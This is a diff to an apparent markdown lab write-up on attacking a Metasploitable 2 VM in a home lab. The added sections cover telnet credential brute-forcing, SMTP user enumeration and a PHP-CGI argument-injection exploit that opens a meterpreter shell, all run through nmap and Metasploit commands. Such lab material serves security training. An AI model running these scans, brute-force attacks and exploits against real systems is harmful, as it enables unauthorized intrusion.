@@ -56,7 +56,7 @@ It was categorised in two categories:
 ## Lets start by Gathering information about our target Metasploitable 2:
 **As we Know that the target is our local machine in our virtual homelab environment So there is not much public information available about our target. So we skip the passive reconn step and move to the Active Scanning**
 
-**Step 1** Now first as we know that the target machine is inside our homelab network but we don't know the ip address of the target.So firstly start with a Hostscan with nmap over entire network to get the ip address of our target Metasploitable 
+**Step I** Now first as we know that the target machine is inside our homelab network but we don't know the ip address of the target.So firstly start with a Hostscan with nmap over entire network to get the ip address of our target Metasploitable 
 ```
 nmap -sn 192.168.1.100/24
 ```
@@ -69,12 +69,12 @@ As from the above result we get that our network has
 
 then there is **192.168.1.103** -> which is our metasploitable machine
 
-**Step 2** Verrfy that Our client is reachable 
+**Step II** Verrfy that Our client is reachable 
 From our Attacker kali machine try to ping our metasploitable machine
 ```
 ping 192.168.1.103
 ```
-**Step 3** As the Host is up and reachable, let do an nmap scan to identify the open ports and its running service along with version detection.
+**Step III** As the Host is up and reachable, let do an nmap scan to identify the open ports and its running service along with version detection.
 ```
 nmap -Pn -sV -v 192.168.1.103
 ```
@@ -110,7 +110,7 @@ nmap -p 21 --script ftp-vsftpd-backdoor.nse 192.168.1.103
 From the output we can conclude that there are 2 main vulnerability present in the **vsftpd-2.3.4**:
 
 **1. Anonymous login allowed without password.**
-**2. A backdoor is present which let us to execute the system command via that backdoor.**
+**2. A Backdoor Command Execution Vulenability.**
 
 ### Exploitation :
 
@@ -171,9 +171,9 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 cd /usr/share/nmap/scripts
 ls -al | grep ssh
 #Check for ssh authentication methods
-nmap -p 22 --scripts ssh-auth-methods.nse
+nmap -p 22 --scripts ssh-auth-methods.nse 192.168.1.103
 #check for algorithm used
-nmap -p 22 --scripts ssh2-enum-algo.nse
+nmap -p 22 --scripts ssh2-enum-algo.nse 192.168.1.103
 ```
 **Output**
 ![](../images/scanning_with_nse_scripts_against_ssh.png)
@@ -181,7 +181,7 @@ nmap -p 22 --scripts ssh2-enum-algo.nse
 From the output we get that the target machine uses both password and private key based authentication. Also we get info about the algorithm used by the ssh-server like rsa,dss which are quite weak and outdated encryption algorithms.But We can conclude a direct vulnerability from here. Now search for vulnerability in this ssh version(Openssh-4.7p1) on internet, search openssh-4.7 exploit, here we found that it has a **user code execution vulnerability** which allow us to execute command on the remote server after getting an ssh connection with the target server and its corresponding exploit is present in the metasploit exploit db module.
 
 ### Exploitation:
-To exploit/attack the ssh service i.e to get the ssh connection to the target we have two methods:
+As we don't have the direct vulneabilty in this ssh version, To exploit/attack this ssh service i.e to get the ssh connection to the target we have two methods:
 
 1. **Bruteforcing the ssh with username and passwords.**
 2. **Using key based authentication.**
@@ -305,3 +305,120 @@ msf auxiliary(ssh_login_pubkey) > exploit
 
 ---
 
+## Exploiting Service on Port 23: telnetd service
+Since telnet(teletype network protocol) is also a remote access protocol like ssh, i.e using telnet we can access and share the server and its resources remotely. It operates on TCP/IP protocol. But telnet does not implement any encryption of data while sharing of data and resources. So it vulerable to MITM and eavesdroping attacks and nowdays it is replaced by more secure protocol like ssh.
+
+![](../images/services_on_port_23.png)
+### Identifying Vulnerabilites or Weakness
+ 1. The main vulnerability or we can say weakness in the telnet protocol was it is prone to **MITM and eavesdroping attack**(i.e if the attacker is able to interfare the communication(estabilise itself as MITM) , it can direcly sees what is being shared/exchanged because there is no encryption. But I am not going to exploit it with MITM.
+ ```
+cd /usr/share/nmap/scripts
+ls -al | grep telnet
+#Check for telnet encryption methods
+nmap -p 23 --scripts telnet_encryption.nse 192.168.1.103
+```
+ ![](../images/running_nse-scripts_for_telnet.png)
+As by running NSE script we got that the telnet is not using any encryption
+ 
+2. As it is a remote access protocol, it uses user-password authentication to establise a connection with the server like the ssh protocol. So we can do **bruteforce to get the username and password** to authenticate wtih the target.
+
+ ### Exploitation
+In order to exploit the telnet service we are **Using bruteforce method** to get the username and password to authenticate with the target.
+### Bruteforcing the telnet service for username and password
+```
+msfconsole
+msf > search telnet_login
+msf > use /auxiliary/scanner/telnet/telnet_login
+msf auxiliary(scanner/telnet/telnet_login) > options
+msf auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /home/kali/test_bruteforce.txt
+msf auxiliary(scanner/telnet/telnet_login) > set USER_FILE /home/kali/test_bruteforce.txt
+msf auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
+msf auxiliary(scanner/telnet/telnet_login) > set VERBOSE true
+msf auxiliary(scanner/telnet/telnet_login) > exploit
+```
+Output:
+
+![](../images/telnet_exploitation_using_bruteforce_1.png)
+![](../images/telnet_exploitation_using_bruteforce_2.png)
+![](../images/telnet_exploitation_using_bruteforce_3.png)
+![](../images/telnet_exploitation_using_bruteforce_4.png)
+Now we get the username and password by bruteforcing with the username and password wordlist. Also the auxiliary estabilise a session with the target where we can execute system command on the target machine.
+
+---
+## Exploiting Service on Port 25: Postfix Smtpd service
+Simple Mail Transfer Protocol (SMTP) is the standard protocol for sending emails across the internet. It operates on port 25 by default (and optionally on port 587 or 465 for secure transmission) and uses a client-server model. SMTP is responsible for transferring email messages from an any email client (outlook,gmail,apple-mail etc) to the reciever Mail server. Nowdays it is encrypted using SSL/TLS to protoct the email-data
+
+![](../images/service_on_port_25.png)
+### Identifying Vulnerabilites or Weakness
+ ```
+cd /usr/share/nmap/scripts
+ls -al | grep smtp
+#Check for vulnerabilities by running all scripts
+nmap -p 25 --scripts "smtp-*" 192.168.1.103
+```
+Output:
+
+![](../images/running_nse-script_for_smtp.png)
+By running various NSE script we can't find a well known vulnerability in this smtp protocol.
+By futher searching we find that we had a enummeration module in the metasploit framework which **identifies the user's** in the smtpd service by bruteforcing request with a wordlist.
+
+### Exploitation
+We can't find a well known vulnerability in the smtpd service to exploit but there is flaw that allow as to enumerate the smtp user's using the smtpd service on the target machine.
+```
+msfconsole
+msf > search smtp_enum
+msf > use auxiliary/scanner/smtp/smtp_enum
+msf auxiliary(scanner/smtp/smtp_enum) > options
+msf auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/smtp/smtp_enum) > exploit
+```
+output:
+![](../images/smtp_users_enum_exploitation.png)
+![](../images/smtp_users_enum_exploitation_2.png)
+![](../images/smtp_users_enum_exploitation_3.png)
+From the output we can conclude that we have identified different user on the target that are using smtpd service.
+
+---
+## Exploiting Service on Port 80: Apache httpd 2.2.8 service
+The Apache HTTP Server (httpd) is an open-source web server software(Web container). It is one of the most widely used web servers in the world, designed to deliver web content through the internet. 
+
+It is compatible with mostly all operating systems like Linux, Windows, and macOS, and can serve both static and dynamic web pages. It uses mostly Php as a server side language.
+![](../images/service_on_port_80.png)
+
+### Identifying Vulnerabilites or Weakness
+By browsing the target ip on the webserver we got, there is an apache server hosting multiple websites. As mostly, apache server uses php as server side language. Lets find which version of php is that target using 
+```
+cd /usr/share/nmap/scripts
+ls -al | grep php-version
+nmap -p 80 --script http-php-version.nse 192.168.1.103
+```
+Ouput:
+![](../images/php_version_detection.png)
+After running the script we get the php has version-> php 5.2.4
+
+Now I use a **searchsploit** tool which search for existing vulnerabilites in this apache 2.2.8 version
+```
+searchsploit apache 2.2.8 | grep php
+```
+Output:
+![](../images/searching_vulnerability_on_apache.png)
+**1. Cgi-bin Remote code execution Vulnerability**
+
+### Exploitation
+#### 1. Exploit cgi-bin Remote code execution Vulnerability in php
+```
+msfconsole
+msf > search php_cgi
+msf > use exploit/multi/http/php_cgi_arg_injection
+msf exploit(multi/http/php_cgi_arg_injection) > options
+#only need to specified the RHOSTS, the Payload is set to default but we can use any custom payload
+msf exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.1.103
+msf exploit(multi/http/php_cgi_arg_injection) > options
+msf exploit(multi/http/php_cgi_arg_injection) > exploit
+```
+![](../images/exploitation_using_cgi_arg_injection.png)
+![](../images/exploitation_using_cgi_arg_injection_2.png)
+![](../images/exploitation_using_cgi_arg_injection_3.png)
+![](../images/exploitation_using_cgi_arg_injection_4.png)
+After executing the exploit we get a meterpreter session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
